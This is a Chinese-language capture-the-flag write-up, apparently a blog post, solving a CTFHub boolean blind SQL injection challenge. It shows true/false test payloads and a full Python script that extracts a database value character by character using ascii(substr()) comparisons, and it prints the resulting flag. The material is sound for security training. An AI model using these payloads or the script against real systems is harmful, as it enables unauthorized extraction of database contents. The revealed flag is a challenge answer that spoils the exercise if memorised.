---
title: CTFHub 布尔盲注
date: 2026-09-28
categories: CTFHub Web
tags: CTFHub Web SQL注入 布尔盲注
---
# 题目：CTFHub 布尔盲注

## 题目描述
CTFHub SQL布尔注入，页面无数据回显，仅返回两种状态： query_success (条件为真)、 query_error (条件为假)，利用页面布尔状态差异逐字符猜解数据。
 
## 解题思路
1. id 参数直接拼接进SQL语句，没有查询结果输出。
- 当SQL条件成立，页面输出 query_success 
- 当SQL条件不成立，页面输出 query_error 
2. 借助 substr() 截取字符串， ascii() 转成ASCII码，脚本循环遍历字符，根据页面真假状态，逐位猜解数据库、表、flag。
 
## 解题步骤
1. 确认注入点
真条件：
?id=1 and 1=1
页面返回  query_success
假条件：
?id=1 and 1=2
页面返回  query_error 
证明存在布尔盲注。
2. Python脚本爆破
1. 在桌面创建一个文本文档将脚本粘贴进去，保存，重命名其为bool.py。
2. win+R输入powershell，输入cd Desktop回车，再输入python bool.py
import requests
import time
#这里的 URL 换成你的靶场地址
url = "http://challenge-629689d10858c00b.sandbox.ctfhub.com:10800/"
#字符集（ASCII 可见字符）
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_@!-"
flag = ""
#假设 flag 最长 50 位
for i in range(1, 51):
    for char in chars:
        #构造 payload，查询当前位是否等于我们尝试的字符
        #注意：这里我们用 '=' 比 '>' 更适合暴力枚举
        payload = f"?id=1 and (select ascii(substr((select flag from flag),{i},1))) = {ord(char)}"
        try:
            r = requests.get(url + payload, timeout=3)
            #如果页面返回包含 query_success，说明猜对了！
            if "query_success" in r.text:
                flag += char
                print(f"[+] 找到第 {i} 位: {char}  当前结果: {flag}")
                break
        except Exception as e:
            pass
    else:
        #如果 50 个字符都没匹配上，说明 flag 结束了
        print(f"[*] 猜测结束，最终 Flag 是: {flag}")
        break

print(f"Final Flag: {flag}")

运行脚本得到数据库名  sqli ，表 flag ，最终flag： ctfhub{5a711dc96686925a2de0f688}

## 踩坑指南
1. 布尔盲注手工几乎不可行，需要脚本循环请求，速度受网络、靶场限速影响。
2. 请求不能发送太快，加 time.sleep(0.1) 延时，防止靶场拒绝访问。
3. CTFHub靶场实例会过期，脚本卡住不动先检查网页是否还可以正常打开。
4. substr(字符串,起始位置,截取长度) ，位置从1开始，不是0。
5. 耐心等待
   布尔盲注逻辑：每猜1个字符，要发送几十次http请求，网络来回耗时间，加上ctfhub靶场有限速，不能瞬间疯狂发包。
## 知识点总结
1. 布尔盲注：无回显、无报错，依靠页面两种不同响应判断SQL语句真假。
2. substr() ：截取字符串； ascii() ：把字符转为ASCII数字，方便脚本比较。
3. 靶场限速：高频发包会被限制，脚本需要设置请求间隔。
4. 布尔注入特点
没有报错、没有数据回显，页面只有两种状态：
query_success  → SQL条件为真
无输出 → SQL条件为假
靠页面真假两种状态猜数据，手工很慢，一般写Python脚本跑。

